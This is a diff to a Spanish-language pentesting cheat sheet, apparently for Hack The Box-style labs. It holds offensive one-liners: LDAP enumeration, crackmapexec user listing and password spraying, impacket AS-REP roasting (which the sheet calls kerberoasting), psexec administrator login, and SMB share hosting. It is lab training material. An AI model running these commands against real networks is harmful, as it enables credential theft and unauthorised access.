@@ -6,6 +6,7 @@
 CAT en windows es TYPE
 WGET en windows es WGET nombredelarchivooriginal -OUTFILE nombrequequieras
 En windows mirar carpetas ocultas no es -la es ls -force
+La root.txt en windows se encuentra en /users/Administrator/Desktop
 ```
 ### WINDOWS
 ```
@@ -35,11 +36,12 @@ ldapsearch -x -H ldap://10.10.10.169 -D '' -w '' -b "DC=megabank,DC=local"  | gr
 ### ENUMERAR USUARIOS/PASSWD
 ```
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
-crackmapexec smb 10.10.10.161 --users
+crackmapexec smb 10.10.10.161 --users  --> saca usuarios de esa ip
 crackmapexec smb 10.10.10.169 -u ./users -p password --no-bruteforce ---> te comprueba una lista de usuarios contra una lista de passwd
 crackmapexec smb 10.10.10.169 -u ./users -p Welcome123! --no-bruteforce ---> te comprueba una lista de usuarios contra un passwd en concreto
 ```
 ### IMPACKET
+impacket-psexec administrator@10.129.95.187 ---> te logea con administrador, te pide la pass luego
 sudo impacket-smbserver share ./
 impacket-GetNPUsers.py active.htb/ -dc-ip 10.10.10.100 -request ---> kerberoasting, tienes una lista de usuarios y sacas la contraseña
 ```
